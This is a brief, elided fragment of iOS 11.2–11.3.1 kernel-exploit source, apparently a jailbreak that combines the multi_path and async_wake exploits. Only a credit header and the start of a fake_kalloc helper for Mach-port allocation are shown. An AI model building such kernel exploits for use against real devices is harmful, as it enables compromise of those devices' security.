//
//  multi_path modified + async_wake kutils
//  iOS 11.2 - 11.3.1
//  Created by GeoSn0w on 5/10/18.
//  Big thanks to Ian Beer for multi_path exploit and async_wake and Jonathan Levin for QiLin!
//
//
...
mach_port_t fake_kalloc(int size) {
    ...
    if (err != KERN_SUCCESS) {
        printf("[!] Unable to allocate port. Bailing out.\n");
    }
    struct simple_msg  {
